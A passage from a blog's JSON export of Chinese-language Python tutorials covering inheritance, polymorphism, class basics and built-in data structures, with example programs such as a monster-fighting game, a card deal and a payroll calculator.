has-a关系通常称之为关联，比如部门和员工的关系，汽车和引擎的关系都属于关联关系；关联关系如果是整体和部分的关联，那么我们称之为聚合关系；如果整体进一步负责了部分的生命周期（整体和部分是不可分割的，同时同在也同时消亡），那么这种就是最强的关联关系，我们称之为合成关系。 use-a关系通常称之为依赖，比如司机有一个驾驶的行为（方法），其中（的参数）使用到了汽车，那么司机和汽车的关系就是依赖关系。 我们可以使用一种叫做UML（统一建模语言）的东西来进行面向对象建模，其中一项重要的工作就是把类和类之间的关系用标准化的图形符号描述出来。关于UML我们在这里不做详细的介绍，有兴趣的读者可以自行阅读《UML面向对象设计基础》一书。 利用类之间的这些关系，我们可以在已有类的基础上来完成某些操作，也可以在已有类的基础上创建新的类，这些都是实现代码复用的重要手段。复用现有的代码不仅可以减少开发的工作量，也有利于代码的管理和维护，这是我们在日常工作中都会使用到的技术手段。 继承和多态刚才我们提到了，可以在已有类的基础上创建新类，这其中的一种做法就是让一个类从另一个类那里将属性和方法直接继承下来，从而减少重复代码的编写。提供继承信息的我们称之为父类，也叫超类或基类；得到继承信息的我们称之为子类，也叫派生类或衍生类。子类除了继承父类提供的属性和方法，还可以定义自己特有的属性和方法，所以子类比父类拥有的更多的能力，在实际开发中，我们经常会用子类对象去替换掉一个父类对象，这是面向对象编程中一个常见的行为，对应的原则称之为里氏替换原则。下面我们先看一个继承的例子。 class Person(object): \"\"\"人\"\"\" def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self._name @property def age(self): return self._age @age.setter def age(self, age): self._age = age def play(self): print('%s正在愉快的玩耍.' % self._name) def watch_av(self): if self._age &gt;= 18: print('%s正在观看爱情动作片.' % self._name) else: print('%s只能观看《熊出没》.' % self._name) class Student(Person): \"\"\"学生\"\"\" def __init__(self, name, age, grade): super().__init__(name, age) self._grade = grade @property def grade(self): return self._grade @grade.setter def grade(self, grade): self._grade = grade def study(self, course): print('%s的%s正在学习%s.' % (self._grade, self._name, course)) class Teacher(Person): \"\"\"老师\"\"\" def __init__(self, name, age, title): super().__init__(name, age) self._title = title @property def title(self): return self._title @title.setter def title(self, title): self._title = title def teach(self, course): print('%s%s正在讲%s.' % (self._name, self._title, course)) def main(): stu = Student('王大锤', 15, '初三') stu.study('数学') stu.watch_av() t = Teacher('骆昊', 38, '砖家') t.teach('Python程序设计') t.watch_av() if __name__ == '__main__': main() 子类在继承了父类的方法后，可以对父类已有的方法给出新的实现版本，这个动作称之为方法重写（override）。通过方法重写我们可以让父类的同一个行为在子类中拥有不同的实现版本，当我们调用这个经过子类重写的方法时，不同的子类对象会表现出不同的行为，这个就是多态（poly-morphism）。 from abc import ABCMeta, abstractmethod class Pet(object, metaclass=ABCMeta): \"\"\"宠物\"\"\" def __init__(self, nickname): self._nickname = nickname @abstractmethod def make_voice(self): \"\"\"发出声音\"\"\" pass class Dog(Pet): \"\"\"狗\"\"\" def make_voice(self): print('%s: 汪汪汪...' % self._nickname) class Cat(Pet): \"\"\"猫\"\"\" def make_voice(self): print('%s: 喵...喵...' % self._nickname) def main(): pets = [Dog('旺财'), Cat('凯蒂'), Dog('大黄')] for pet in pets: pet.make_voice() if __name__ == '__main__': main() 在上面的代码中，我们将Pet类处理成了一个抽象类，所谓抽象类就是不能够创建对象的类，这种类的存在就是专门为了让其他类去继承它。Python从语法层面并没有像Java或C#那样提供对抽象类的支持，但是我们可以通过abc模块的ABCMeta元类和abstractmethod包装器来达到抽象类的效果，如果一个类中存在抽象方法那么这个类就不能够实例化（创建对象）。上面的代码中，Dog和Cat两个子类分别对Pet类中的make_voice抽象方法进行了重写并给出了不同的实现版本，当我们在main函数中调用该方法时，这个方法就表现出了多态行为（同样的方法做了不同的事情）。 综合案例案例1：奥特曼打小怪兽。from abc import ABCMeta, abstractmethod from random import randint, randrange class Fighter(object, metaclass=ABCMeta): \"\"\"战斗者\"\"\" # 通过__slots__魔法限定对象可以绑定的成员变量 __slots__ = ('_name', '_hp') def __init__(self, name, hp): \"\"\"初始化方法 :param name: 名字 :param hp: 生命值 \"\"\" self._name = name self._hp = hp @property def name(self): return self._name @property def hp(self): return self._hp @hp.setter def hp(self, hp): self._hp = hp if hp &gt;= 0 else 0 @property def alive(self): return self._hp &gt; 0 @abstractmethod def attack(self, other): \"\"\"攻击 :param other: 被攻击的对象 \"\"\" pass class Ultraman(Fighter): \"\"\"奥特曼\"\"\" __slots__ = ('_name', '_hp', '_mp') def __init__(self, name, hp, mp): \"\"\"初始化方法 :param name: 名字 :param hp: 生命值 :param mp: 魔法值 \"\"\" super().__init__(name, hp) self._mp = mp def attack(self, other): other.hp -= randint(15, 25) def huge_attack(self, other): \"\"\"究极必杀技(打掉对方至少50点或四分之三的血) :param other: 被攻击的对象 :return: 使用成功返回True否则返回False \"\"\" if self._mp &gt;= 50: self._mp -= 50 injury = other.hp * 3 // 4 injury = injury if injury &gt;= 50 else 50 other.hp -= injury return True else: self.attack(other) return False def magic_attack(self, others): \"\"\"魔法攻击 :param others: 被攻击的群体 :return: 使用魔法成功返回True否则返回False \"\"\" if self._mp &gt;= 20: self._mp -= 20 for temp in others: if temp.alive: temp.hp -= randint(10, 15) return True else: return False def resume(self): \"\"\"恢复魔法值\"\"\" incr_point = randint(1, 10) self._mp += incr_point return incr_point def __str__(self): return '~~~%s奥特曼~~~\\n' % self._name + \\ '生命值: %d\\n' % self._hp + \\ '魔法值: %d\\n' % self._mp class Monster(Fighter): \"\"\"小怪兽\"\"\" __slots__ = ('_name', '_hp') def attack(self, other): other.hp -= randint(10, 20) def __str__(self): return '~~~%s小怪兽~~~\\n' % self._name + \\ '生命值: %d\\n' % self._hp def is_any_alive(monsters): \"\"\"判断有没有小怪兽是活着的\"\"\" for monster in monsters: if monster.alive &gt; 0: return True return False def select_alive_one(monsters): \"\"\"选中一只活着的小怪兽\"\"\" monsters_len = len(monsters) while True: index = randrange(monsters_len) monster = monsters[index] if monster.alive &gt; 0: return monster def display_info(ultraman, monsters): \"\"\"显示奥特曼和小怪兽的信息\"\"\" print(ultraman) for monster in monsters: print(monster, end='') def main(): u = Ultraman('骆昊', 1000, 120) m1 = Monster('狄仁杰', 250) m2 = Monster('白元芳', 500) m3 = Monster('王大锤', 750) ms = [m1, m2, m3] fight_round = 1 while u.alive and is_any_alive(ms): print('========第%02d回合========' % fight_round) m = select_alive_one(ms) # 选中一只小怪兽 skill = randint(1, 10) # 通过随机数选择使用哪种技能 if skill &lt;= 6: # 60%的概率使用普通攻击 print('%s使用普通攻击打了%s.' % (u.name, m.name)) u.attack(m) print('%s的魔法值恢复了%d点.' % (u.name, u.resume())) elif skill &lt;= 9: # 30%的概率使用魔法攻击(可能因魔法值不足而失败) if u.magic_attack(ms): print('%s使用了魔法攻击.' % u.name) else: print('%s使用魔法失败.' % u.name) else: # 10%的概率使用究极必杀技(如果魔法值不足则使用普通攻击) if u.huge_attack(m): print('%s使用究极必杀技虐了%s.' % (u.name, m.name)) else: print('%s使用普通攻击打了%s.' % (u.name, m.name)) print('%s的魔法值恢复了%d点.' % (u.name, u.resume())) if m.alive &gt; 0: # 如果选中的小怪兽没有死就回击奥特曼 print('%s回击了%s.' % (m.name, u.name)) m.attack(u) display_info(u, ms) # 每个回合结束后显示奥特曼和小怪兽的信息 fight_round += 1 print('\\n========战斗结束!========\\n') if u.alive &gt; 0: print('%s奥特曼胜利!' % u.name) else: print('小怪兽胜利!') if __name__ == '__main__': main() 案例2：扑克游戏。import random class Card(object): \"\"\"一张牌\"\"\" def __init__(self, suite, face): self._suite = suite self._face = face @property def face(self): return self._face @property def suite(self): return self._suite def __str__(self): if self._face == 1: face_str = 'A' elif self._face == 11: face_str = 'J' elif self._face == 12: face_str = 'Q' elif self._face == 13: face_str = 'K' else: face_str = str(self._face) return '%s%s' % (self._suite, face_str) def __repr__(self): return self.__str__() class Poker(object): \"\"\"一副牌\"\"\" def __init__(self): self._cards = [Card(suite, face) for suite in '♠♥♣♦' for face in range(1, 14)] self._current = 0 @property def cards(self): return self._cards def shuffle(self): \"\"\"洗牌(随机乱序)\"\"\" self._current = 0 random.shuffle(self._cards) @property def next(self): \"\"\"发牌\"\"\" card = self._cards[self._current] self._current += 1 return card @property def has_next(self): \"\"\"还有没有牌\"\"\" return self._current &lt; len(self._cards) class Player(object): \"\"\"玩家\"\"\" def __init__(self, name): self._name = name self._cards_on_hand = [] @property def name(self): return self._name @property def cards_on_hand(self): return self._cards_on_hand def get(self, card): \"\"\"摸牌\"\"\" self._cards_on_hand.append(card) def arrange(self, card_key): \"\"\"玩家整理手上的牌\"\"\" self._cards_on_hand.sort(key=card_key) # 排序规则-先根据花色再根据点数排序 def get_key(card): return (card.suite, card.face) def main(): p = Poker() p.shuffle() players = [Player('东邪'), Player('西毒'), Player('南帝'), Player('北丐')] for _ in range(13): for player in players: player.get(p.next) for player in players: print(player.name + ':', end=' ') player.arrange(get_key) print(player.cards_on_hand) if __name__ == '__main__': main() 说明： 大家可以自己尝试在上面代码的基础上写一个简单的扑克游戏，例如21点(Black Jack)，游戏的规则可以自己在网上找一找。 案例3：工资结算系统。\"\"\" 某公司有三种类型的员工 分别是部门经理、程序员和销售员 需要设计一个工资结算系统 根据提供的员工信息来计算月薪 部门经理的月薪是每月固定15000元 程序员的月薪按本月工作时间计算 每小时150元 销售员的月薪是1200元的底薪加上销售额5%的提成 \"\"\" from abc import ABCMeta, abstractmethod class Employee(object, metaclass=ABCMeta): \"\"\"员工\"\"\" def __init__(self, name): \"\"\" 初始化方法 :param name: 姓名 \"\"\" self._name = name @property def name(self): return self._name @abstractmethod def get_salary(self): \"\"\" 获得月薪 :return: 月薪 \"\"\" pass class Manager(Employee): \"\"\"部门经理\"\"\" def get_salary(self): return 15000.0 class Programmer(Employee): \"\"\"程序员\"\"\" def __init__(self, name, working_hour=0): super().__init__(name) self._working_hour = working_hour @property def working_hour(self): return self._working_hour @working_hour.setter def working_hour(self, working_hour): self._working_hour = working_hour if working_hour &gt; 0 else 0 def get_salary(self): return 150.0 * self._working_hour class Salesman(Employee): \"\"\"销售员\"\"\" def __init__(self, name, sales=0): super().__init__(name) self._sales = sales @property def sales(self): return self._sales @sales.setter def sales(self, sales): self._sales = sales if sales &gt; 0 else 0 def get_salary(self): return 1200.0 + self._sales * 0.05 def main(): emps = [ Manager('刘备'), Programmer('诸葛亮'), Manager('曹操'), Salesman('荀彧'), Salesman('吕布'), Programmer('张辽'), Programmer('赵云') ] for emp in emps: if isinstance(emp, Programmer): emp.working_hour = int(input('请输入%s本月工作时间: ' % emp.name)) elif isinstance(emp, Salesman): emp.sales = float(input('请输入%s本月销售额: ' % emp.name)) # 同样是接收get_salary这个消息但是不同的员工表现出了不同的行为(多态) print('%s本月工资为: ￥%s元' % (emp.name, emp.get_salary())) if __name__ == '__main__': main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"08面向对象编程基础","slug":"08面向对象编程基础","date":"2021-05-11T00:15:16.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/5700f03a.html","link":"","permalink":"http://www.xiaocaibi.top/posts/5700f03a.html","excerpt":"","text":"面向对象编程基础活在当下的程序员应该都听过\"面向对象编程\"一词，也经常有人问能不能用一句话解释下什么是\"面向对象编程\"，我们先来看看比较正式的说法。 \"把一组数据结构和处理它们的方法组成对象（object），把相同行为的对象归纳为类（class），通过类的封装（encapsulation）隐藏内部细节，通过继承（inheritance）实现类的特化（specialization）和泛化（generalization），通过多态（polymorphism）实现基于对象类型的动态分派。\" 这样一说是不是更不明白了。所以我们还是看看更通俗易懂的说法，下面这段内容来自于知乎。 说明： 以上的内容来自于网络，不代表作者本人的观点和看法，与作者本人立场无关，相关责任不由作者承担。 之前我们说过\"程序是指令的集合\"，我们在程序中书写的语句在执行时会变成一条或多条指令然后由CPU去执行。当然为了简化程序的设计，我们引入了函数的概念，把相对独立且经常重复使用的代码放置到函数中，在需要使用这些功能的时候只要调用函数即可；如果一个函数的功能过于复杂和臃肿，我们又可以进一步将函数继续切分为子函数来降低系统的复杂性。但是说了这么多，不知道大家是否发现，所谓编程就是程序员按照计算机的工作方式控制计算机完成各种任务。但是，计算机的工作方式与正常人类的思维模式是不同的，如果编程就必须得抛弃人类正常的思维方式去迎合计算机，编程的乐趣就少了很多，\"每个人都应该学习编程\"这样的豪言壮语就只能说说而已。当然，这些还不是最重要的，最重要的是当我们需要开发一个复杂的系统时，代码的复杂性会让开发和维护工作都变得举步维艰，所以在上世纪60年代末期，\"软件危机\"、\"软件工程\"等一系列的概念开始在行业中出现。 当然，程序员圈子内的人都知道，现实中并没有解决上面所说的这些问题的\"银弹\"，真正让软件开发者看到希望的是上世纪70年代诞生的Smalltalk编程语言中引入的面向对象的编程思想（面向对象编程的雏形可以追溯到更早期的Simula语言）。按照这种编程理念，程序中的数据和操作数据的函数是一个逻辑上的整体，我们称之为“对象”，而我们解决问题的方式就是创建出需要的对象并向对象发出各种各样的消息，多个对象的协同工作最终可以让我们构造出复杂的系统来解决现实中的问题。 说明： 当然面向对象也不是解决软件开发中所有问题的最后的“银弹”，所以今天的高级程序设计语言几乎都提供了对多种编程范式的支持，Python也不例外。 类和对象简单的说，类是对象的蓝图和模板，而对象是类的实例。这个解释虽然有点像用概念在解释概念，但是从这句话我们至少可以看出，类是抽象的概念，而对象是具体的东西。在面向对象编程的世界中，一切皆为对象，对象都有属性和行为，每个对象都是独一无二的，而且对象一定属于某个类（型）。当我们把一大堆拥有共同特征的对象的静态特征（属性）和动态特征（行为）都抽取出来后，就可以定义出一个叫做“类”的东西。 定义类在Python中可以使用class关键字定义类，然后在类中通过之前学习过的函数来定义方法，这样就可以将对象的动态特征描述出来，代码如下所示。 class Student(object): # __init__是一个特殊方法用于在创建对象时进行初始化操作 # 通过这个方法我们可以为学生对象绑定name和age两个属性 def __init__(self, name, age): self.name = name self.age = age def study(self, course_name): print('%s正在学习%s.' % (self.name, course_name)) # PEP 8要求标识符的名字用全小写多个单词用下划线连接 # 但是部分程序员和公司更倾向于使用驼峰命名法(驼峰标识) def watch_movie(self): if self.age &lt; 18: print('%s只能观看《熊出没》.' % self.name) else: print('%s正在观看岛国爱情大电影.' % self.name) 说明： 写在类中的函数，我们通常称之为（对象的）方法，这些方法就是对象可以接收的消息。 创建和使用对象当我们定义好一个类之后，可以通过下面的方式来创建对象并给对象发消息。 def main(): # 创建学生对象并指定姓名和年龄 stu1 = Student('骆昊', 38) # 给对象发study消息 stu1.study('Python程序设计') # 给对象发watch_av消息 stu1.watch_movie() stu2 = Student('王大锤', 15) stu2.study('思想品德') stu2.watch_movie() if __name__ == '__main__': main() 访问可见性问题对于上面的代码，有C++、Java、C#等编程经验的程序员可能会问，我们给Student对象绑定的name和age属性到底具有怎样的访问权限（也称为可见性）。因为在很多面向对象编程语言中，我们通常会将对象的属性设置为私有的（private）或受保护的（protected），简单的说就是不允许外界访问，而对象的方法通常都是公开的（public），因为公开的方法就是对象能够接受的消息。在Python中，属性和方法的访问权限只有两种，也就是公开的和私有的，如果希望属性是私有的，在给属性命名时可以用两个下划线作为开头，下面的代码可以验证这一点。 class Test: def __init__(self, foo): self.__foo = foo def __bar(self): print(self.__foo) print('__bar') def main(): test = Test('hello') # AttributeError: 'Test' object has no attribute '__bar' test.__bar() # AttributeError: 'Test' object has no attribute '__foo' print(test.__foo) if __name__ == \"__main__\": main() 但是，Python并没有从语法上严格保证私有属性或方法的私密性，它只是给私有的属性和方法换了一个名字来妨碍对它们的访问，事实上如果你知道更换名字的规则仍然可以访问到它们，下面的代码就可以验证这一点。之所以这样设定，可以用这样一句名言加以解释，就是\"We are all consenting adults here\"。因为绝大多数程序员都认为开放比封闭要好，而且程序员要自己为自己的行为负责。 class Test: def __init__(self, foo): self.__foo = foo def __bar(self): print(self.__foo) print('__bar') def main(): test = Test('hello') test._Test__bar() print(test._Test__foo) if __name__ == \"__main__\": main() 在实际开发中，我们并不建议将属性设置为私有的，因为这会导致子类无法访问（后面会讲到）。所以大多数Python程序员会遵循一种命名惯例就是让属性名以单下划线开头来表示属性是受保护的，本类之外的代码在访问这样的属性时应该要保持慎重。这种做法并不是语法上的规则，单下划线开头的属性和方法外界仍然是可以访问的，所以更多的时候它是一种暗示或隐喻，关于这一点可以看看我的《Python - 那些年我们踩过的那些坑》文章中的讲解。 面向对象的支柱面向对象有三大支柱：封装、继承和多态。后面两个概念在下一个章节中进行详细的说明，这里我们先说一下什么是封装。我自己对封装的理解是\"隐藏一切可以隐藏的实现细节，只向外界暴露（提供）简单的编程接口\"。我们在类中定义的方法其实就是把数据和对数据的操作封装起来了，在我们创建了对象之后，只需要给对象发送一个消息（调用方法）就可以执行方法中的代码，也就是说我们只需要知道方法的名字和传入的参数（方法的外部视图），而不需要知道方法内部的实现细节（方法的内部视图）。 练习练习1：定义一个类描述数字时钟。参考答案： from time import sleep class Clock(object): \"\"\"数字时钟\"\"\" def __init__(self, hour=0, minute=0, second=0): \"\"\"初始化方法 :param hour: 时 :param minute: 分 :param second: 秒 \"\"\" self._hour = hour self._minute = minute self._second = second def run(self): \"\"\"走字\"\"\" self._second += 1 if self._second == 60: self._second = 0 self._minute += 1 if self._minute == 60: self._minute = 0 self._hour += 1 if self._hour == 24: self._hour = 0 def show(self): \"\"\"显示时间\"\"\" return '%02d:%02d:%02d' % \\ (self._hour, self._minute, self._second) def main(): clock = Clock(23, 59, 58) while True: print(clock.show()) sleep(1) clock.run() if __name__ == '__main__': main() 练习2：定义一个类描述平面上的点并提供移动点和计算到另一个点距离的方法。参考答案： from math import sqrt class Point(object): def __init__(self, x=0, y=0): \"\"\"初始化方法 :param x: 横坐标 :param y: 纵坐标 \"\"\" self.x = x self.y = y def move_to(self, x, y): \"\"\"移动到指定位置 :param x: 新的横坐标 \"param y: 新的纵坐标 \"\"\" self.x = x self.y = y def move_by(self, dx, dy): \"\"\"移动指定的增量 :param dx: 横坐标的增量 \"param dy: 纵坐标的增量 \"\"\" self.x += dx self.y += dy def distance_to(self, other): \"\"\"计算与另一个点的距离 :param other: 另一个点 \"\"\" dx = self.x - other.x dy = self.y - other.y return sqrt(dx ** 2 + dy ** 2) def __str__(self): return '(%s, %s)' % (str(self.x), str(self.y)) def main(): p1 = Point(3, 5) p2 = Point() print(p1) print(p2) p2.move_by(-1, 2) print(p2) print(p1.distance_to(p2)) if __name__ == '__main__': main() 说明： 本章中的插图来自于Grady Booch等著作的《面向对象分析与设计》一书，该书是讲解面向对象编程的经典著作，有兴趣的读者可以购买和阅读这本书来了解更多的面向对象的相关知识。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"07字符串和常用数据结构","slug":"07字符串和常用数据结构","date":"2021-05-10T00:30:32.000Z","updated":"2021-09-20T08:47:43.869Z","comments":true,"path":"posts/3982712.html","link":"","permalink":"http://www.xiaocaibi.top/posts/3982712.html","excerpt":"","text":"字符串和常用数据结构使用字符串第二次世界大战促使了现代电子计算机的诞生，最初计算机被应用于导弹弹道的计算，而在计算机诞生后的很多年时间里，计算机处理的信息基本上都是数值型的信息。世界上的第一台电子计算机叫ENIAC（电子数值积分计算机），诞生于美国的宾夕法尼亚大学，每秒钟能够完成约5000次浮点运算。随着时间的推移，虽然数值运算仍然是计算机日常工作中最为重要的事情之一，但是今天的计算机处理得更多的数据可能都是以文本的方式存在的，如果我们希望通过Python程序操作本这些文本信息，就必须要先了解字符串类型以及与它相关的知识。 所谓字符串，就是由零个或多个字符组成的有限序列，一般记为。在Python程序中，如果我们把单个或多个字符用单引号或者双引号包围起来，就可以表示一个字符串。 s1 = 'hello, world!' s2 = \"hello, world!\" # 以三个双引号或单引号开头的字符串可以折行 s3 = \"\"\" hello, world! \"\"\" print(s1, s2, s3, end='') 可以在字符串中使用\\（反斜杠）来表示转义，也就是说\\后面的字符不再是它原来的意义，例如：\\n不是代表反斜杠和字符n，而是表示换行；而\\t也不是代表反斜杠和字符t，而是表示制表符。所以如果想在字符串中表示'要写成\\'，同理想表示\\要写成\\\\。可以运行下面的代码看看会输出什么。 s1 = '\\'hello, world!\\'' s2 = '\\n\\\\hello, world!\\\\\\n' print(s1, s2, end='') 在\\后面还可以跟一个八进制或者十六进制数来表示字符，例如\\141和\\x61都代表小写字母a，前者是八进制的表示法，后者是十六进制的表示法。也可以在\\后面跟Unicode字符编码来表示字符，例如\\u9a86\\u660a代表的是中文“骆昊”。运行下面的代码，看看输出了什么。 s1 = '\\141\\142\\143\\x61\\x62\\x63' s2 = '\\u9a86\\u660a' print(s1, s2) 如果不希望字符串中的\\表示转义，我们可以通过在字符串的最前面加上字母r来加以说明，再看看下面的代码又会输出什么。 s1 = r'\\'hello, world!\\'' s2 = r'\\n\\\\hello, world!\\\\\\n' print(s1, s2, end='') Python为字符串类型提供了非常丰富的运算符，我们可以使用+运算符来实现字符串的拼接，可以使用*运算符来重复一个字符串的内容，可以使用in和not in来判断一个字符串是否包含另外一个字符串（成员运算），我们也可以用[]和[:]运算符从字符串取出某个字符或某些字符（切片运算），代码如下所示。 s1 = 'hello ' * 3 print(s1) # hello hello hello s2 = 'world' s1 += s2 print(s1) # hello hello hello world print('ll' in s1) # True print('good' in s1) # False str2 = 'abc123456' # 从字符串中取出指定位置的字符(下标运算) print(str2[2]) # c # 字符串切片(从指定的开始索引到指定的结束索引) print(str2[2:5]) # c12 print(str2[2:]) # c123456 print(str2[2::2]) # c246 print(str2[::2]) # ac246 print(str2[::-1]) # 654321cba print(str2[-3:-1]) # 45 在Python中，我们还可以通过一系列的方法来完成对字符串的处理，代码如下所示。 str1 = 'hello, world!' # 通过内置函数len计算字符串的长度 print(len(str1)) # 13 # 获得字符串首字母大写的拷贝 print(str1.capitalize()) # Hello, world! # 获得字符串每个单词首字母大写的拷贝 print(str1.title()) # Hello, World! # 获得字符串变大写后的拷贝 print(str1.upper()) # HELLO, WORLD! # 从字符串中查找子串所在位置 print(str1.find('or')) # 8 print(str1.find('shit')) # -1 # 与find类似但找不到子串时会引发异常 # print(str1.index('or')) # print(str1.index('shit')) # 检查字符串是否以指定的字符串开头 print(str1.startswith('He')) # False print(str1.startswith('hel')) # True # 检查字符串是否以指定的字符串结尾 print(str1.endswith('!')) # True # 将字符串以指定的宽度居中并在两侧填充指定的字符 print(str1.center(50, '*')) # 将字符串以指定的宽度靠右放置左侧填充指定的字符 print(str1.rjust(50, ' ')) str2 = 'abc123456' # 检查字符串是否由数字构成 print(str2.isdigit()) # False # 检查字符串是否以字母构成 print(str2.isalpha()) # False # 检查字符串是否以数字和字母构成 print(str2.isalnum()) # True str3 = ' jackfrued@126.com ' print(str3) # 获得字符串修剪左右两侧空格之后的拷贝 print(str3.strip()) 我们之前讲过，可以用下面的方式来格式化输出字符串。 a, b = 5, 10 print('%d * %d = %d' % (a, b, a * b)) 当然，我们也可以用字符串提供的方法来完成字符串的格式，代码如下所示。 a, b = 5, 10 print('{0} * {1} = {2}'.format(a, b, a * b)) Python 3.6以后，格式化字符串还有更为简洁的书写方式，就是在字符串前加上字母f，我们可以使用下面的语法糖来简化上面的代码。 a, b = 5, 10 print(f'{a} * {b} = {a * b}') 除了字符串，Python还内置了多种类型的数据结构，如果要在程序中保存和操作数据，绝大多数时候可以利用现有的数据结构来实现，最常用的包括列表、元组、集合和字典。 使用列表不知道大家是否注意到，刚才我们讲到的字符串类型（str）和之前我们讲到的数值类型（int和float）有一些区别。数值类型是标量类型，也就是说这种类型的对象没有可以访问的内部结构；而字符串类型是一种结构化的、非标量类型，所以才会有一系列的属性和方法。接下来我们要介绍的列表（list），也是一种结构化的、非标量类型，它是值的有序序列，每个值都可以通过索引进行标识，定义列表可以将列表的元素放在[]中，多个元素用,进行分隔，可以使用for循环对列表元素进行遍历，也可以使用[]或[:]运算符取出列表中的一个或多个元素。 下面的代码演示了如何定义列表、如何遍历列表以及列表的下标运算。 list1 = [1, 3, 5, 7, 100] print(list1) # [1, 3, 5, 7, 100] # 乘号表示列表元素的重复 list2 = ['hello'] * 3 print(list2) # ['hello', 'hello', 'hello'] # 计算列表长度(元素个数) print(len(list1)) # 5 # 下标(索引)运算 print(list1[0]) # 1 print(list1[4]) # 100 # print(list1[5]) # IndexError: list index out of range print(list1[-1]) # 100 print(list1[-3]) # 5 list1[2] = 300 print(list1) # [1, 3, 300, 7, 100] # 通过循环用下标遍历列表元素 for index in range(len(list1)): print(list1[index]) # 通过for循环遍历列表元素 for elem in list1: print(elem) # 通过enumerate函数处理列表之后再遍历可以同时获得元素索引和值 for index, elem in enumerate(list1): print(index, elem) 下面的代码演示了如何向列表中添加元素以及如何从列表中移除元素。 list1 = [1, 3, 5, 7, 100] # 添加元素 list1.append(200) list1.insert(1, 400) # 合并两个列表 # list1.extend([1000, 2000]) list1 += [1000, 2000] print(list1) # [1, 400, 3, 5, 7, 100, 200, 1000, 2000] print(len(list1)) # 9 # 先通过成员运算判断元素是否在列表中，如果存在就删除该元素 if 3 in list1: list1.remove(3) if 1234 in list1: list1.remove(1234) print(list1) # [1, 400, 5, 7, 100, 200, 1000, 2000] # 从指定的位置删除元素 list1.pop(0) list1.pop(len(list1) - 1) print(list1) # [400, 5, 7, 100, 200, 1000] # 清空列表元素 list1.clear() print(list1) # [] 和字符串一样，列表也可以做切片操作，通过切片操作我们可以实现对列表的复制或者将列表中的一部分取出来创建出新的列表，代码如下所示。 fruits = ['grape', 'apple', 'strawberry', 'waxberry'] fruits += ['pitaya', 'pear', 'mango'] # 列表切片 fruits2 = fruits[1:4] print(fruits2) # apple strawberry waxberry # 可以通过完整切片操作来复制列表 fruits3 = fruits[:] print(fruits3) # ['grape', 'apple', 'strawberry', 'waxberry', 'pitaya', 'pear', 'mango'] fruits4 = fruits[-3:-1] print(fruits4) # ['pitaya', 'pear'] # 可以通过反向切片操作来获得倒转后的列表的拷贝 fruits5 = fruits[::-1] print(fruits5) # ['mango', 'pear', 'pitaya', 'waxberry', 'strawberry', 'apple', 'grape'] 下面的代码实现了对列表的排序操作。 list1 = ['orange', 'apple', 'zoo', 'internationalization', 'blueberry'] list2 = sorted(list1) # sorted函数返回列表排序后的拷贝不会修改传入的列表 # 函数的设计就应该像sorted函数一样尽可能不产生副作用 list3 = sorted(list1, reverse=True) # 通过key关键字参数指定根据字符串长度进行排序而不是默认的字母表顺序 list4 = sorted(list1, key=len) print(list1) print(list2) print(list3) print(list4) # 给列表对象发出排序消息直接在列表对象上进行排序 list1.sort(reverse=True) print(list1) 生成式和生成器我们还可以使用列表的生成式语法来创建列表，代码如下所示。 f = [x for x in range(1, 10)] print(f) f = [x + y for x in 'ABCDE' for y in '1234567'] print(f) # 用列表的生成表达式语法创建列表容器 # 用这种语法创建列表之后元素已经准备就绪所以需要耗费较多的内存空间 f = [x ** 2 for x in range(1, 1000)] print(sys.getsizeof(f)) # 查看对象占用内存的字节数 print(f) # 请注意下面的代码创建的不是一个列表而是一个生成器对象 # 通过生成器可以获取到数据但它不占用额外的空间存储数据 # 每次需要数据的时候就通过内部的运算得到数据(需要花费额外的时间) f = (x ** 2 for x in range(1, 1000)) print(sys.getsizeof(f)) # 相比生成式生成器不占用存储数据的空间 print(f) for val in f: print(val) 除了上面提到的生成器语法，Python中还有另外一种定义生成器的方式，就是通过yield关键字将一个普通函数改造成生成器函数。下面的代码演示了如何实现一个生成斐波拉切数列的生成器。所谓斐波拉切数列可以通过下面递归的方法来进行定义： def fib(n): a, b = 0, 1 for _ in range(n): a, b = b, a + b yield a def main(): for val in fib(20): print(val) if __name__ == '__main__': main() 使用元组Python中的元组与列表类似也是一种容器数据类型，可以用一个变量（对象）来存储多个数据，不同之处在于元组的元素不能修改，在前面的代码中我们已经不止一次使用过元组了。顾名思义，我们把多个元素组合到一起就形成了一个元组，所以它和列表一样可以保存多条数据。下面的代码演示了如何定义和使用元组。 # 定义元组 t = ('骆昊', 38, True, '四川成都') print(t) # 获取元组中的元素 print(t[0]) print(t[3]) # 遍历元组中的值 for member in t: print(member) # 重新给元组赋值 # t[0] = '王大锤' # TypeError # 变量t重新引用了新的元组原来的元组将被垃圾回收 t = ('王大锤', 20, True, '云南昆明') print(t) # 将元组转换成列表 person = list(t) print(person) # 列表是可以修改它的元素的 person[0] = '李小龙' person[1] = 25 print(person) # 将列表转换成元组 fruits_list = ['apple', 'banana', 'orange'] fruits_tuple = tuple(fruits_list) print(fruits_tuple) 这里有一个非常值得探讨的问题，我们已经有了列表这种数据结构，为什么还需要元组这样的类型呢？ 元组中的元素是无法修改的，事实上我们在项目中尤其是多线程环境（后面会讲到）中可能更喜欢使用的是那些不变对象（一方面因为对象状态不能修改，所以可以避免由此引起的不必要的程序错误，简单的说就是一个不变的对象要比可变的对象更加容易维护；另一方面因为没有任何一个线程能够修改不变对象的内部状态，一个不变对象自动就是线程安全的，这样就可以省掉处理同步化的开销。一个不变对象可以方便的被共享访问）。所以结论就是：如果不需要对元素进行添加、删除、修改的时候，可以考虑使用元组，当然如果一个方法要返回多个值，使用元组也是不错的选择。 元组在创建时间和占用的空间上面都优于列表。我们可以使用sys模块的getsizeof函数来检查存储同样的元素的元组和列表各自占用了多少内存空间，这个很容易做到。我们也可以在ipython中使用魔法指令%timeit来分析创建同样内容的元组和列表所花费的时间，下图是我的macOS系统上测试的结果。 使用集合Python中的集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。 可以按照下面代码所示的方式来创建和使用集合。 # 创建集合的字面量语法 set1 = {1, 2, 3, 3, 3, 2} print(set1) print('Length =', len(set1)) # 创建集合的构造器语法(面向对象部分会进行详细讲解) set2 = set(range(1, 10)) set3 = set((1, 2, 3, 3, 2, 1)) print(set2, set3) # 创建集合的推导式语法(推导式也可以用于推导集合) set4 = {num for num in 